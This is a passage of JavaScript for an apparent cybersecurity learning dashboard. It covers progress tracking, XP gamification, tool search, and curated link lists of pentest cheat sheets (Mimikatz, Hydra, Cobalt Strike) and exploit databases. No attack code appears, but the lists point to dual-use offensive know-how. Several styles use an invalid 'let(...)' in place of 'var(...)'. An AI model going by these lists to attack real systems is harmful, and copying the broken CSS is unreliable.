
// DEEP REFACTOR: Global Event Listener Manager
// Tracks all added event listeners and automatically cleans them up before major DOM updates
const _originalAddEventListener = EventTarget.prototype.addEventListener;
const _originalRemoveEventListener = EventTarget.prototype.removeEventListener;

window._activeListeners = [];

EventTarget.prototype.addEventListener = function(type, listener, options) {
    window._activeListeners.push({ target: this, type, listener, options });
    _originalAddEventListener.call(this, type, listener, options);
};

EventTarget.prototype.removeEventListener = function(type, listener, options) {
    window._activeListeners = window._activeListeners.filter(
        l => !(l.target === this && l.type === type && l.listener === listener)
    );
    _originalRemoveEventListener.call(this, type, listener, options);
};

window.cleanupOrphanedListeners = function() {
    let activeCount = window._activeListeners.length;
    window._activeListeners.forEach(l => {
        // If the target is a DOM node and it's no longer in the document, remove the listener
        if (l.target instanceof Node && !document.contains(l.target)) {
            _originalRemoveEventListener.call(l.target, l.type, l.listener, l.options);
        }
    });
    // Filter out the ones we removed
    window._activeListeners = window._activeListeners.filter(l => !(l.target instanceof Node && !document.contains(l.target)));
    console.log(`Deep Refactor: Cleaned up ${activeCount - window._activeListeners.length} orphaned listeners.`);
};

// Hook into tab switching to clean up memory
const originalRenderProjects = renderProjects;
renderProjects = function() {
    window.cleanupOrphanedListeners();
    originalRenderProjects.apply(this, arguments);
};

/* ==== Main Application Logic (extracted from index.html) ==== */
// DOM Nodes
const navLinks = document.querySelectorAll('.nav-link');
const tabPanels = document.querySelectorAll('.tab-panel');
const panelTitle = document.getElementById('panel-title');
const panelSubtitle = document.getElementById('panel-subtitle');

// Gamification & Audio Synthesizer Engine
let userXP = parseInt(localStorage.getItem('roadmap-user-xp') || '0');
let audioCtx = null;

function addXP(amount) {
    userXP += amount;
    if (userXP < 0) userXP = 0;
    localStorage.setItem('roadmap-user-xp', userXP);
    updateLevelHUD();
}

function updateLevelHUD() {
    const level = Math.floor(userXP / 100) + 1;
    const currentLevelXP = userXP % 100;
    
    const ranks = [
        "Script Kiddie",       // Level 1
        "Newbie Explorer",     // Level 2
        "Code Crack",          // Level 3
        "Network Intruder",    // Level 4
        "Security Auditor",    // Level 5
        "White Hat Hero",      // Level 6
        "Kernel Exploiter",    // Level 7
        "Root Administrator"   // Level 8+
    ];
    const rankTitle = ranks[Math.min(level - 1, ranks.length - 1)];

    const hudBadge = document.getElementById('hud-level-badge');
    const rankLabel = document.getElementById('hud-rank-label');
    const progressFill = document.getElementById('hud-level-progress-fill');
    const xpText = document.getElementById('hud-xp-text');

    if (hudBadge) hudBadge.textContent = level;
    if (rankLabel) rankLabel.textContent = rankTitle;
    if (progressFill) progressFill.style.width = `${currentLevelXP}%`;
    if (xpText) xpText.textContent = `${currentLevelXP} / 100 XP (Total: ${userXP} XP)`;
}

function playDingSound() {
    const soundToggle = document.getElementById('acc-sound-toggle');
    if (soundToggle && !soundToggle.checked) return;

    try {
        if (!audioCtx) {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }
        if (audioCtx.state === 'suspended') {
            audioCtx.resume();
        }

        const osc = audioCtx.createOscillator();
        const gainNode = audioCtx.createGain();

        osc.connect(gainNode);
        gainNode.connect(audioCtx.destination);

        osc.type = 'sine';
        osc.frequency.setValueAtTime(880, audioCtx.currentTime); // A5 note
        gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
        gainNode.gain.linearRampToValueAtTime(0.2, audioCtx.currentTime + 0.02); // attack
        gainNode.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.5); // decay

        osc.start(audioCtx.currentTime);
        osc.stop(audioCtx.currentTime + 0.5);
    } catch (e) {
        console.error('AudioContext error:', e);
    }
}
const sidebar = document.getElementById('sidebar');
const mobileToggle = document.getElementById('mobile-menu-toggle');

// Page Subtitle Mapping
const tabMeta = {
    overview: { title: "Overview Panel", subtitle: "E-hacker Cybersecurity specialization pathways" },
    roadmap: { title: "Timeline Roadmap", subtitle: "Interactive learning milestones. Check off skills as you learn!" },
    projects: { title: "Project Hub", subtitle: "100 curated hands-on cybersecurity projects with step-by-step implementation guides" },
    tools: { title: "Tool Finder", subtitle: "Searchable database of essential tools with quick tutorial links" },
    resources: { title: "Channel Directory", subtitle: "Curated learning portals, training hubs, and YouTube courses" },
    pdf: { title: "PDF Library", subtitle: "Curated database of direct-download cheat sheets, books, and blueprints" },
    portal: { title: "Hacker Portal", subtitle: "Curated directory of essential platforms, vulnerability DBs, and tools used by security professionals" },
    osint: { title: "OSINT Tools", subtitle: "Curated directory of open-source intelligence search engines, metadata extractors, and footprinters" },
    git: { title: "GitHub Scripts", subtitle: "Curated directory of essential GitHub repositories, automated scripts, and security payload listings" },
    quiz: { title: "Practice Quiz", subtitle: "Interactive cybersecurity practice exam and certification exam prep session" },
    planner: { title: "Study Planner", subtitle: "Organize your study timeline and document commands, goals, and notes" },
    adhd: { title: "ADHD Focus Hub", subtitle: "Neurodivergent focus aids, gamified quests, and productivity boosters" },
    about: { title: "About Developer", subtitle: "Connect with the developer of the E-hacker Hub" }
};

// Navigation tab click switching logic
navLinks.forEach(link => {
    link.addEventListener('click', () => {
        const targetTab = link.getAttribute('data-tab');
        
        // Toggle nav state
        navLinks.forEach(l => l.classList.remove('active'));
        link.classList.add('active');

        // Toggle tabs
        tabPanels.forEach(panel => {
            panel.classList.remove('active');
        });
        document.getElementById(`tab-${targetTab}`).classList.add('active');

        // Update headers
        panelTitle.textContent = tabMeta[targetTab].title;
        panelSubtitle.textContent = tabMeta[targetTab].subtitle;

        // Close mobile sidebar on navigation click
        if (window.innerWidth <= 1024) {
            sidebar.classList.remove('open');
        }
    });
});

// Mobile menu toggle click
mobileToggle.addEventListener('click', () => {
    sidebar.classList.toggle('open');
});

// Close sidebar if window clicked elsewhere on mobile
document.body.addEventListener('click', (e) => {
    if (window.innerWidth <= 1024) {
        if (!sidebar.contains(e.target) && !mobileToggle.contains(e.target)) {
            sidebar.classList.remove('open');
        }
    }
});

// Accordion Stage Toggle
function toggleStage(stageId) {
    const card = document.getElementById(`stage-card-${stageId}`);
    
    // Check if card is currently open
    const isOpen = card.classList.contains('open');

    // Close all stages first (optional accordion behavior)
    document.querySelectorAll('.timeline-stage-card').forEach(c => {
        c.classList.remove('open');
    });

    // Toggle selected card
    if (!isOpen) {
        card.classList.add('open');
    }
}

// Keep Stage 1 expanded by default
document.getElementById('stage-card-1').classList.add('open');

// Progress Calculation & Checklist state persistent save
const skillCheckboxes = document.querySelectorAll('.skill-checkbox');
const globalProgressBar = document.getElementById('global-progress-bar');
const globalProgressPercent = document.getElementById('global-progress-percent');
const globalProgressStatus = document.getElementById('global-progress-status');

// Load states from LocalStorage
skillCheckboxes.forEach(checkbox => {
    const savedState = localStorage.getItem(`roadmap-checked-${checkbox.id}`);
    if (savedState === 'true') {
        checkbox.checked = true;
    }

    checkbox.addEventListener('change', () => {
        localStorage.setItem(`roadmap-checked-${checkbox.id}`, checkbox.checked);
        
        // Gamification XP adjustments & auditory ding & visual haptic pulse
        if (checkbox.checked) {
            addXP(10);
            playDingSound();
            
            const label = checkbox.closest('.checklist-item');
            if (label) {
                label.classList.remove('pulse-success');
                void label.offsetWidth; // Reflow to restart animation
                label.classList.add('pulse-success');
            }
        } else {
            addXP(-10);
        }

        calculateProgress();
    });
});

// Calculate progress logic
function calculateProgress() {
    const totalSkills = skillCheckboxes.length; // 38 total skills
    let checkedSkills = 0;

    // Grouping calculations per stage
    for (let stageNum = 1; stageNum <= 6; stageNum++) {
        const stageCheckboxes = document.querySelectorAll(`#stage-card-${stageNum} .skill-checkbox`);
        const stageTotal = stageCheckboxes.length;
        let stageChecked = 0;

        stageCheckboxes.forEach(cb => {
            if (cb.checked) {
                stageChecked++;
                checkedSkills++;
            }
        });

        // Update stage progress badge pill
        document.getElementById(`stage-prog-${stageNum}`).textContent = `${stageChecked}/${stageTotal} Completed`;

        // Toggle card stage-completed class
        const stageCardEl = document.getElementById(`stage-card-${stageNum}`);
        if (stageCardEl) {
            if (stageTotal > 0 && stageChecked === stageTotal) {
                stageCardEl.classList.add('stage-completed');
            } else {
                stageCardEl.classList.remove('stage-completed');
            }
        }

        // Dynamic completed stamp logic
        const stageHeaderRight = document.querySelector(`#stage-card-${stageNum} .stage-header-right`);
        let stampEl = document.getElementById(`stage-stamp-${stageNum}`);
        if (stageTotal > 0 && stageChecked === stageTotal) {
            if (!stampEl && stageHeaderRight) {
                stampEl = document.createElement('span');
                stampEl.id = `stage-stamp-${stageNum}`;
                stampEl.className = 'stage-completed-stamp';
                stampEl.innerHTML = '✔ Mastered';
                stageHeaderRight.insertBefore(stampEl, stageHeaderRight.querySelector('.accordion-arrow'));
            } else if (stampEl) {
                stampEl.style.display = 'inline-flex';
            }
        } else {
            if (stampEl) {
                stampEl.style.display = 'none';
            }
        }

        // Update progress table row fill and text
        const stagePercent = stageTotal === 0 ? 0 : Math.round((stageChecked / stageTotal) * 100);
        const fillEl = document.getElementById(`table-prog-fill-${stageNum}`);
        const pctEl = document.getElementById(`table-prog-pct-${stageNum}`);
        const rowEl = document.getElementById(`table-row-${stageNum}`);
        
        if (fillEl) fillEl.style.width = `${stagePercent}%`;
        if (pctEl) pctEl.textContent = `${stagePercent}%`;
        
        if (rowEl) {
            if (stagePercent === 100) {
                rowEl.classList.add('completed-row');
                rowEl.style.borderLeft = "3px solid let(--color-success)";
            } else {
                rowEl.classList.remove('completed-row');
                rowEl.style.borderLeft = "none";
            }
        }
    }

    // Global stats updates
    const percentage = Math.round((checkedSkills / totalSkills) * 100);
    
    // Update circular progress SVG
    // Circular perimeter: 2 * PI * r = 2 * 3.14159 * 24.5 = 154
    const perimeter = 154;
    const offset = perimeter - (checkedSkills / totalSkills) * perimeter;
    globalProgressBar.style.strokeDashoffset = offset;
    
    globalProgressPercent.textContent = `${percentage}%`;
    globalProgressStatus.textContent = `${checkedSkills} / ${totalSkills} skills completed`;
}

// Run initial progress stats call
calculateProgress();
updateLevelHUD();

        // Tool Search Box Engine
const toolSearchInput = document.getElementById('tool-search');
const clearSearchBtn = document.getElementById('clear-search');
const noToolsResults = document.getElementById('no-results');
const noToolsResultsText = document.getElementById('no-results-text');
const ytToolsFallbackLink = document.getElementById('yt-fallback-link');

const toolCategoryCards = document.querySelectorAll('.tool-category-card');
const toolCardItems = document.querySelectorAll('.tool-card-item');

// Store original text content for highlights
toolCardItems.forEach(item => {
    const nameEl = item.querySelector('.tool-lbl-name');
    const descEl = item.querySelector('.tool-lbl-desc');
    if (nameEl) item.setAttribute('data-name', nameEl.textContent.trim());
    if (descEl) item.setAttribute('data-desc', descEl.textContent.trim());
});

function escapeSearchRegex(string) {
    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function highlightSearchText(element, query, originalText) {
    if (!query) {
        element.textContent = originalText;
        return;
    }
    const escapedQuery = escapeSearchRegex(query);
    const regex = new RegExp(`(${escapedQuery})`, 'gi');
    element.innerHTML = originalText.replace(regex, '<span class="highlight">$1</span>');
}

// Filter Chips selection
const filterChips = document.querySelectorAll('.filter-chip');
let activeFilter = 'all';

filterChips.forEach(chip => {
    chip.addEventListener('click', () => {
        filterChips.forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        activeFilter = chip.getAttribute('data-filter');
        filterTools();
    });
});

// Modified tool search listener
toolSearchInput.addEventListener('input', filterTools);

function filterTools() {
    const query = toolSearchInput.value.trim().toLowerCase();
    
    // Toggle clear button
    if (query.length > 0) {
        clearSearchBtn.style.display = 'flex';
    } else {
        clearSearchBtn.style.display = 'none';
    }

    let visibleToolsCounter = 0;

    toolCategoryCards.forEach(category => {
        const categoryId = category.getAttribute('data-category');
        const categoryTitle = category.querySelector('h3').textContent.toLowerCase();
        const itemsInCat = category.querySelectorAll('.tool-card-item');
        let visibleItemsInCat = 0;

        // Check category level filter first
        const matchesFilter = (activeFilter === 'all' || categoryId === activeFilter);

        if (!matchesFilter) {
            category.style.display = 'none';
            return;
        }

        itemsInCat.forEach(item => {
            const originalName = item.getAttribute('data-name');
            const originalDesc = item.getAttribute('data-desc');
            const nameLower = originalName.toLowerCase();
            const descLower = originalDesc.toLowerCase();
            
            const nameEl = item.querySelector('.tool-lbl-name');
            const descEl = item.querySelector('.tool-lbl-desc');

            const matchesName = nameLower.includes(query);
            const matchesDesc = descLower.includes(query);
            const matchesCategory = categoryTitle.includes(query);

            if (matchesName || matchesDesc || matchesCategory) {
                item.style.display = 'flex';
                visibleItemsInCat++;
                visibleToolsCounter++;
                
                // Highlight text matches
                if (matchesName && query) {
                    highlightSearchText(nameEl, query, originalName);
                } else {
                    nameEl.textContent = originalName;
                }

                if (matchesDesc && query) {
                    highlightSearchText(descEl, query, originalDesc);
                } else {
                    descEl.textContent = originalDesc;
                }
            } else {
                item.style.display = 'none';
                nameEl.textContent = originalName;
                descEl.textContent = originalDesc;
            }
        });

        // Display tool categories dynamically
        if (visibleItemsInCat > 0 || (categoryTitle.includes(query) && itemsInCat.length > 0)) {
            category.style.display = 'block';
            
            // If Category matches, show all its items
            if (categoryTitle.includes(query) && visibleItemsInCat === 0) {
                itemsInCat.forEach(item => {
                    item.style.display = 'flex';
                    visibleToolsCounter++;
                    
                    const originalName = item.getAttribute('data-name');
                    const originalDesc = item.getAttribute('data-desc');
                    item.querySelector('.tool-lbl-name').textContent = originalName;
                    item.querySelector('.tool-lbl-desc').textContent = originalDesc;
                });
            }
        } else {
            category.style.display = 'none';
        }
    });

    // Show Youtube search fallback if no tools found
    if (visibleToolsCounter === 0 && (query.length > 0 || activeFilter !== 'all')) {
        noToolsResults.style.display = 'block';
        if (visibleToolsCounter === 0 && query.length > 0) {
            noToolsResultsText.textContent = `No tools found matching "${toolSearchInput.value}".`;
            ytToolsFallbackLink.href = `https://www.youtube.com/results?search_query=${encodeURIComponent(toolSearchInput.value + ' tutorial cybersecurity')}`;
            ytToolsFallbackLink.style.display = 'inline-flex';
        } else {
            noToolsResultsText.textContent = `No tools in this category match your current filters.`;
            ytToolsFallbackLink.style.display = 'none';
        }
    } else {
        noToolsResults.style.display = 'none';
    }
}

// Clear search button event
clearSearchBtn.addEventListener('click', () => {
    toolSearchInput.value = '';
    toolSearchInput.dispatchEvent(new Event('input'));
    toolSearchInput.focus();
});

// Google PDF Search Button click listener
const pdfSearchBtn = document.getElementById('pdf-search-btn');
pdfSearchBtn.addEventListener('click', () => {
    const query = toolSearchInput.value.trim();
    const searchTerms = query ? `${query} cheatsheet filetype:pdf` : 'cybersecurity roadmap cheatsheet filetype:pdf';
    window.open(`https://www.google.com/search?q=${encodeURIComponent(searchTerms)}`, '_blank');
});

// ================================
// PDF Library Interactive Engine
// ================================
const pdfLibraryData = [
    { name: "VirtualBox", desc: "Official User Manual covering setup, VM configuration, and command-line usage.", category: "fundamentals", type: "User Manual", url: "https://www.virtualbox.org/manual/UserManual.pdf", size: "6.2 MB" },
    { name: "Kali Linux", desc: "Official 'Kali Linux Revealed' book guide covering installation, configuration, and security.", category: "fundamentals", type: "Book", url: "https://www.kali.org/pdf/kali-book-en.pdf", size: "12.8 MB" },
    { name: "Linux Ubuntu", desc: "Shortcuts and quick terminal references for Ubuntu desktop navigation.", category: "fundamentals", type: "Cheat Sheet", url: "https://cheat-sheets.org/saved-copy/ubuntu-shortcuts-ref-card.pdf", size: "120 KB" },
    { name: "Git", desc: "Standard Git operations cheat sheet covering init, clone, staging, branching, and remote syncing.", category: "fundamentals", type: "Cheat Sheet", url: "https://training.github.com/downloads/github-git-cheat-sheet.pdf", size: "150 KB" },
    { name: "Python", desc: "Beginner's reference card covering variables, lists, dicts, classes, loops, and syntax.", category: "fundamentals", type: "Cheat Sheet", url: "https://www.ehmatthes.com/gitchat/pcc_2e/beginners_python_cheat_sheet_pcc_2e.pdf", size: "850 KB" },
    { name: "Bash Shell", desc: "Terminal scripting shortcut cheatsheet for automation and environment variables.", category: "fundamentals", type: "Cheat Sheet", url: "https://cheat-sheets.org/saved-copy/bash-commands-cheat-sheet.pdf", size: "220 KB" },
    { name: "Wireshark", desc: "SANS core filter reference cheatsheet for analyzing pcap packet logs.", category: "pentest", type: "SANS Cheat Sheet", url: "https://www.sans.org/security-resources/Wireshark_Cheat_Sheet.pdf", size: "450 KB" },
    { name: "Nmap", desc: "SANS core host scanning and service discovery syntax cheat sheet.", category: "pentest", type: "SANS Cheat Sheet", url: "https://www.sans.org/security-resources/sec560/nmap_cheat_sheet_v1.pdf", size: "380 KB" },
    { name: "TCPDump", desc: "SANS command line packet capture filter reference sheet.", category: "pentest", type: "SANS Cheat Sheet", url: "https://www.sans.org/security-resources/tcpdump_cheat_sheet.pdf", size: "290 KB" },
    { name: "OpenSSL", desc: "Certificate generation, conversion, and cipher test commands cheatsheet.", category: "pentest", type: "Cheat Sheet", url: "https://www.cheat-sheets.org/saved-copy/openssl-cheat-sheet.pdf", size: "180 KB" },
    { name: "Hydra", desc: "Brute-forcing network login credentials command examples.", category: "pentest", type: "Cheat Sheet", url: "https://raw.githubusercontent.com/frizb/Thc-Hydra-Cheat-Sheet/master/hydra-cheat-sheet.pdf", size: "310 KB" },
    { name: "John the Ripper", desc: "Password cracking modes, hash identification, and wordlist rules cheatsheet.", category: "pentest", type: "Cheat Sheet", url: "https://www.cheat-sheets.org/saved-copy/john-the-ripper-cheat-sheet.pdf", size: "140 KB" },
    { name: "Metasploit Framework", desc: "SANS Metasploit console commands, payloads, and post-exploitation reference sheet.", category: "pentest", type: "SANS Cheat Sheet", url: "https://www.sans.org/security-resources/sec560/metasploit_cheat_sheet_v1.pdf", size: "410 KB" },
    { name: "Burp Suite", desc: "Burp proxy configuration, repeater, intruder, and sequencer shortcuts.", category: "pentest", type: "Cheat Sheet", url: "https://raw.githubusercontent.com/sushantkamble/Burp-Suite-Cheat-Sheet/master/burp-suite-cheat-sheet.pdf", size: "290 KB" },
    { name: "Nessus", desc: "Official Tenable User Guide for vulnerability scanning and policy setup.", category: "scanning", type: "User Guide", url: "https://docs.tenable.com/nessus/Nessus_User_Guide.pdf", size: "4.8 MB" },
    { name: "OpenVAS", desc: "Greenbone Security Manager/OpenVAS vulnerability scanner administration manual.", category: "scanning", type: "User Manual", url: "https://docs.greenbone.net/GSM-Manual/pdf/GSM-Manual-en.pdf", size: "9.5 MB" },
    { name: "OWASP ZAP", desc: "Official ZAP getting started guide for web application scanning.", category: "scanning", type: "User Guide", url: "https://www.zaproxy.org/pdf/ZAPGettingStartedGuide-2.4.pdf", size: "1.1 MB" },
    { name: "SQLMap", desc: "Database automated injection syntax and target parameter reference sheet.", category: "pentest", type: "Cheat Sheet", url: "https://cheat-sheets.org/saved-copy/sqlmap-cheatsheet.pdf", size: "350 KB" },
    { name: "Cobalt Strike", desc: "Red Team beacon management, payload generation, and pivoting cheat sheet.", category: "pentest", type: "Cheat Sheet", url: "https://hausec.files.wordpress.com/2021/04/cobalt-strike-cheat-sheet-v1.pdf", size: "780 KB" },
    { name: "Ghidra (Reverse Eng)", desc: "NSA official Ghidra code browser analysis keyboard shortcuts reference.", category: "pentest", type: "NSA Cheat Sheet", url: "https://github.com/NationalSecurityAgency/ghidra/raw/master/GhidraDocs/CheatSheet.pdf", size: "480 KB" },
    { name: "Empire", desc: "SANS PowerShell Empire agent deployment and post-exploitation reference sheet.", category: "pentest", type: "SANS Cheat Sheet", url: "https://www.sans.org/security-resources/sec560/empire_cheat_sheet.pdf", size: "320 KB" },
    { name: "Mimikatz", desc: "SANS lsass dump, pass-the-hash, golden ticket, and credential recovery cheat sheet.", category: "pentest", type: "SANS Cheat Sheet", url: "https://www.sans.org/security-resources/Mimikatz_Cheat_Sheet.pdf", size: "360 KB" },
    { name: "Volatility", desc: "SANS memory forensic plugin, profile selection, and artifact recovery sheet.", category: "pentest", type: "SANS Cheat Sheet", url: "https://www.sans.org/security-resources/Volatility_Memory_Forensics_Cheat_Sheet.pdf", size: "430 KB" },
    { name: "Aircrack-ng", desc: "Wireless network pentest, monitor mode, WEP/WPA cracking cheatsheet.", category: "pentest", type: "Cheat Sheet", url: "https://www.stationx.net/wp-content/uploads/2021/05/Aircrack-ng-Cheat-Sheet.pdf", size: "310 KB" },
    { name: "Frida", desc: "Dynamic binary instrumentation API script snippets reference guide.", category: "pentest", type: "Cheat Sheet", url: "https://github.com/Dvd848/Frida-Cheatsheet/raw/master/Frida-Cheatsheet.pdf", size: "180 KB" },
    { name: "Burp Suite Pro", desc: "Official PortSwigger Burp Suite Desktop user manual.", category: "pentest", type: "User Manual", url: "https://portswigger.net/burp/documentation/desktop/index.pdf", size: "15.4 MB" },
    { name: "Qualys", desc: "QualysGuard Vulnerability Management quick setup and policy scan outline.", category: "scanning", type: "User Guide", url: "https://www.qualys.com/docs/qualys-guard-quick-start.pdf", size: "1.2 MB" },
    { name: "Splunk", desc: "Splunk Search Processing Language (SPL) index querying and analysis guide.", category: "monitoring", type: "User Guide", url: "https://www.splunk.com/pdfs/solution-guides/splunk-quick-reference-guide.pdf", size: "1.9 MB" },
    { name: "Elastic Stack", desc: "Elasticsearch index mapping, query DSL, and Kibana search reference card.", category: "monitoring", type: "Cheat Sheet", url: "https://cheat-sheets.org/saved-copy/Elasticsearch-Cheat-Sheet.pdf", size: "420 KB" },
    { name: "Shodan", desc: "Shodan search filters, command-line tool syntax, and API integration guide.", category: "monitoring", type: "Cheat Sheet", url: "https://www.shodan.io/static/downloads/shodan-cheat-sheet.pdf", size: "290 KB" },
    { name: "StackOverflow", desc: "Advanced site search syntax, tags, and user commands reference card.", category: "resources", type: "Cheat Sheet", url: "https://cheat-sheets.org/saved-copy/StackOverflow-CheatSheet.pdf", size: "110 KB" },
    { name: "GitHub", desc: "Standard Git operations and GitHub pull request workflows cheat sheet.", category: "resources", type: "Cheat Sheet", url: "https://training.github.com/downloads/github-git-cheat-sheet.pdf", size: "150 KB" },
    { name: "Reddit r/cybersecurity", desc: "SANS interactive cyber security career path poster and guidance booklet.", category: "resources", type: "Guide Book", url: "https://www.sans.org/media/cyber-security-roadmap.pdf", size: "3.4 MB" },
    { name: "OWASP.org", desc: "OWASP Top 10 Web Application Security Risks official consensus document.", category: "resources", type: "Standard Document", url: "https://owasp.org/www-pdf-archive/OWASP_Top_10_2021_v1.0.pdf", size: "2.1 MB" },
    { name: "MITRE ATT&CK", desc: "Enterprise ATT&CK matrix evaluation and design pattern mapping guide.", category: "resources", type: "Reference Guide", url: "https://attack.mitre.org/docs/ATTACK_Enterprise_Evaluation_Cheat_Sheet.pdf", size: "890 KB" },
    { name: "CyberDefenders", desc: "SANS Incident Response and Blue Team operations reference poster.", category: "resources", type: "SANS Cheat Sheet", url: "https://www.sans.org/posters/blue-team-cheat-sheet.pdf", size: "2.8 MB" },
    { name: "CompTIA", desc: "Official CompTIA Security+ SY0-701 certification exam objectives outline.", category: "certs", type: "Exam Outline", url: "https://www.comptia.org/content/dam/comptia/global/pdf/exam-objectives/comptia-security-sy0-701-exam-objectives.pdf", size: "1.4 MB" },
    { name: "EC-Council", desc: "Certified Ethical Hacker CEHv12 certification syllabus brochure.", category: "certs", type: "Syllabus Guide", url: "https://www.eccouncil.org/wp-content/uploads/2022/10/CEH-v12-Brochure.pdf", size: "3.1 MB" },
    { name: "Offensive Security", desc: "PEN-200 / OSCP exam preparation course syllabus outline.", category: "certs", type: "Syllabus Guide", url: "https://www.offsec.com/documentation/pen-200-syllabus.pdf", size: "780 KB" },
    { name: "ISC2 CISSP", desc: "Official CISSP exam outline and domain definitions guide.", category: "certs", type: "Exam Outline", url: "https://www.isc2.org/-/media/Project/ISC2/Main/Domain/Certification/CISSP-Certification-Exam-Outline-English.pdf", size: "1.1 MB" },
    { name: "GIAC Certifications", desc: "GIAC Cyber Security certification pathway roadmap guide.", category: "certs", type: "Roadmap Poster", url: "https://www.giac.org/media/certification-roadmap.pdf", size: "2.3 MB" },
    { name: "eLearnSecurity", desc: "Official eJPTv2 exam syllabus outline.", category: "certs", type: "Syllabus Guide", url: "https://www.elearnsecurity.com/collateral/eJPTv2_Syllabus.pdf", size: "850 KB" }
];

const pdfLibraryGrid = document.getElementById('pdf-cards-grid');
const pdfSearchInput = document.getElementById('pdf-library-search');
const clearPdfSearchBtn = document.getElementById('clear-pdf-search');
const pdfNoResults = document.getElementById('pdf-no-results');
const pdfNoResultsText = document.getElementById('pdf-no-results-text');
const pdfGoogleFallbackLink = document.getElementById('pdf-google-fallback-link');
const pdfFilterChips = document.querySelectorAll('[data-pdf-filter]');

let activePdfFilter = 'all';

function renderPdfLibrary() {
    if (!pdfLibraryGrid) return;
    const query = pdfSearchInput.value.trim().toLowerCase();
    pdfLibraryGrid.innerHTML = '';
    
    // Toggle clear button
    if (query.length > 0) {
        clearPdfSearchBtn.style.display = 'flex';
    } else {
        clearPdfSearchBtn.style.display = 'none';
    }

    let visibleCount = 0;

    pdfLibraryData.forEach(pdf => {
        const matchesCategory = (activePdfFilter === 'all' || pdf.category === activePdfFilter);
        
        const nameLower = pdf.name.toLowerCase();
        const descLower = pdf.desc.toLowerCase();
        const typeLower = pdf.type.toLowerCase();
        
        const matchesName = nameLower.includes(query);
        const matchesDesc = descLower.includes(query);
        const matchesType = typeLower.includes(query);

        if (matchesCategory && (matchesName || matchesDesc || matchesType)) {
            visibleCount++;
            
            // Highlight logic
            let highlightedName = pdf.name;
            let highlightedDesc = pdf.desc;
            
            if (query) {
                const escapedQuery = escapeSearchRegex(query);
                const regex = new RegExp(`(${escapedQuery})`, 'gi');
                highlightedName = pdf.name.replace(regex, '<span class="highlight">$1</span>');
                highlightedDesc = pdf.desc.replace(regex, '<span class="highlight">$1</span>');
            }

            const card = document.createElement('div');
            card.className = 'channel-card';
            card.innerHTML = `
                <span class="channel-badge" style="background: rgba(0, 255, 102, 0.06); border-color: rgba(0, 255, 102, 0.2); color: let(--color-accent);">${pdf.type} (${pdf.size})</span>
                <h3>${highlightedName}</h3>
                <p>${highlightedDesc}</p>
                <a href="${pdf.url}" target="_blank" rel="noopener" class="channel-btn" style="background: rgba(0, 255, 204, 0.08); border-color: rgba(0, 255, 204, 0.3); color: let(--color-pink); margin-top: auto; display: inline-flex; align-items: center; gap: 8px; justify-content: center; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; font-weight: 600; padding: 10px 16px; border-radius: 20px; text-decoration: none; transition: let(--transition);">
                    <svg viewBox="0 0 24 24" style="fill: currentColor; width: 16px; height: 16px;"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg> Download PDF
                </a>
            `;
            pdfLibraryGrid.appendChild(card);
        }
    });

    // Toggle no results
    if (visibleCount === 0) {
        pdfNoResults.style.display = 'block';
        if (query.length > 0) {
            pdfNoResultsText.textContent = `No PDFs found matching "${pdfSearchInput.value}".`;
            pdfGoogleFallbackLink.href = `https://www.google.com/search?q=${encodeURIComponent(pdfSearchInput.value + ' filetype:pdf')}`;
            pdfGoogleFallbackLink.style.display = 'inline-flex';
        } else {
            pdfNoResultsText.textContent = `No PDFs found in this category.`;
            pdfGoogleFallbackLink.style.display = 'none';
        }
    } else {
        pdfNoResults.style.display = 'none';
    }
}

if (pdfSearchInput) {
    pdfSearchInput.addEventListener('input', renderPdfLibrary);
}
if (clearPdfSearchBtn) {
    clearPdfSearchBtn.addEventListener('click', () => {
        pdfSearchInput.value = '';
        renderPdfLibrary();
        pdfSearchInput.focus();
    });
}

pdfFilterChips.forEach(chip => {
    chip.addEventListener('click', () => {
        pdfFilterChips.forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        activePdfFilter = chip.getAttribute('data-pdf-filter');
        renderPdfLibrary();
    });
});

// Initial render call
renderPdfLibrary();

// ================================
// Hacker Portal Interactive Engine
// ================================
const hackerPortalData = [
    { name: "Exploit Database", desc: "The ultimate database of public exploits and shellcode. Crucial for pen-testing and research.", category: "db", type: "Exploit Database", url: "https://www.exploit-db.com/" },
    { name: "Mitre CVE Dictionary", desc: "The official standard database dictionary of Common Vulnerabilities and Exposures.", category: "db", type: "CVE Registry", url: "https://cve.mitre.org/" },
    { name: "National Vulnerability Database (NVD)", desc: "NIST standard repository of vulnerability management data, analysis, and CVSS scores.", category: "db", type: "NVD Registry", url: "https://nvd.nist.gov/" },
    { name: "SecurityFocus", desc: "Home of the famous Bugtraq mailing list and historical vulnerability databases.", category: "db", type: "Mailing List & DB", url: "https://www.securityfocus.com/" },
    
    { name: "VirusTotal", desc: "Malware scanner analyzing suspicious files and URLs to detect threats via antivirus engines.", category: "intel", type: "File & URL Scan", url: "https://www.virustotal.com/" },
    { name: "Have I Been Pwned", desc: "Security check tool verifying if your email accounts have been compromised in data breaches.", category: "intel", type: "Breach Intel", url: "https://haveibeenpwned.com/" },
    { name: "Shodan Search Engine", desc: "Search engine for Internet-connected devices. Crucial for passive scanning and OSINT.", category: "intel", type: "IoT Search", url: "https://www.shodan.io/" },
    { name: "Censys", desc: "Attack surface management search engine for analyzing internet-exposed servers and certificates.", category: "intel", type: "Host Search", url: "https://censys.io/" },
    { name: "GTFOBins", desc: "Curated directory of Unix binaries that can be exploited to bypass local security restrictions.", category: "intel", type: "PrivEsc Reference", url: "https://gtfobins.github.io/" },
    { name: "LOLBAS Project", desc: "Living Off The Land Binaries and Scripts directory for Windows privilege escalation research.", category: "intel", type: "PrivEsc Reference", url: "https://lolbas-project.github.io/" },
    { name: "OSINT Framework", desc: "Excellent interactive directory of open-source intelligence assets and search links.", category: "intel", type: "OSINT Map", url: "https://osintframework.com/" },
    { name: "DeHashed", desc: "Enterprise asset search engine for leaked credentials and credential exposure intelligence.", category: "intel", type: "Credential Intel", url: "https://www.dehashed.com/" },
